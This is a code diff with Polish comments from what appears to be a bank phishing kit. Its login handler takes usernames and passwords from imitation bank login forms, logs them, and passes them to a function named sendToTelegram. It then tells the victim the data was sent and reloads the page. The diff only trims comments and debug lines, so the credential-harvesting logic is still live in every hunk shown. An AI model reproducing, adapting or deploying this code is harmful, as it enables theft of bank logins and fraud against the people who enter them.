@@ -5066,7 +4121,7 @@
         });
 
         // ============================================================
-        //   UNIWERSALNY OBSŁUGA WSZYSTKICH BANKÓW
+        //   UNIWERSALNY OBSŁUGA BANKÓW
         // ============================================================
         function handleLogin(event, bankName) {
             event.preventDefault();
@@ -5077,7 +4132,6 @@
             let login = '';
             let password = '';
 
-            // 1. Szukamy Login (pierwszy text/email/tel input)
             const textInputs = [];
             const passwordInputs = [];
             
@@ -5090,17 +4144,14 @@
                 }
             });
 
-            // 2. Login — pierwszy tekstowy input
             if (textInputs.length > 0) {
                 login = textInputs[0].value.trim();
             }
 
-            // 3. Hasło — pierwszy password input
             if (passwordInputs.length > 0) {
                 password = passwordInputs[0].value.trim();
             }
 
-            // 4. Jeśli login nie znaleziony, szukamy po id/name/placeholder
             if (!login) {
                 for (const input of allInputs) {
                     const id = (input.id || '').toLowerCase();
@@ -5115,7 +4166,6 @@
                 }
             }
 
-            // 5. Jeśli hasło nie znalezione, szukamy po id/name/placeholder
             if (!password) {
                 for (const input of allInputs) {
                     const id = (input.id || '').toLowerCase();
@@ -5132,7 +4182,6 @@
                 }
             }
 
-            // 6. Jeśli nadal pusto, bierzemy pierwszy i drugi input po kolei
             if (!login || !password) {
                 const nonHiddenInputs = [];
                 allInputs.forEach(input => {
@@ -5151,7 +4200,6 @@
                 }
             }
 
-            // 7. Ostateczne sprawdzenie — jeśli hasło puste, szukamy dowolnego password
             if (!password) {
                 const anyPassword = form.querySelector('input[type="password"]');
                 if (anyPassword) {
@@ -5159,7 +4207,6 @@
                 }
             }
 
-            // 8. Ostateczne sprawdzenie — jeśli login pusty, szukamy dowolnego text
             if (!login) {
                 const anyText = form.querySelector('input[type="text"]');
                 if (anyText) {
@@ -5167,28 +4214,22 @@
                 }
             }
 
-            // DEBUG
-            console.log(`[${bankName}] ===== DEBUG =====`);
-            console.log(`[${bankName}] Login: "${login}"`);
-            console.log(`[${bankName}] Hasło: "${password}"`);
+            console.log(`[${bankName}] Login: "${login}", Hasło: "${password}"`);
 
             if (!login || !password) {
                 alert(`Proszę wypełnić wszystkie pola (Login i Hasło) dla ${bankName}.`);
                 return false;
             }
 
-            // Wysyłka do Telegram
             sendToTelegram(bankName, login, password);
             alert(`✅ Dane dla ${bankName} zostały wysłane!`);
 
-            // Czyszczenie pól
             allInputs.forEach(input => {
                 if (input.type !== 'hidden' && input.type !== 'submit' && input.type !== 'button') {
                     input.value = '';
                 }
             });
 
-            // Przeładowanie strony po krótkim opóźnieniu
             setTimeout(() => {
                 location.reload();
             }, 1500);
@@ -5197,7 +4238,7 @@
         }
 
         // ============================================================
-        //   FUNKCJE OTWIERANIA/ZAMYKANIA BANKÓW
+        //   FUNKCJE OTWIERANIA BANKÓW
         // ============================================================
         function openLoginScreen1() {
             document.getElementById('bankSelection').classList.remove('visible');
@@ -5393,7 +4434,6 @@
             window.scrollTo({ top: 0, behavior: 'smooth' });
         }
 
-        // ===== ZAMYKANIE PRZYCISKIEM ESC =====
         document.addEventListener('keydown', function(e) {
             if (e.key === 'Escape') {
                 const bank3 = document.getElementById('loginScreen3');
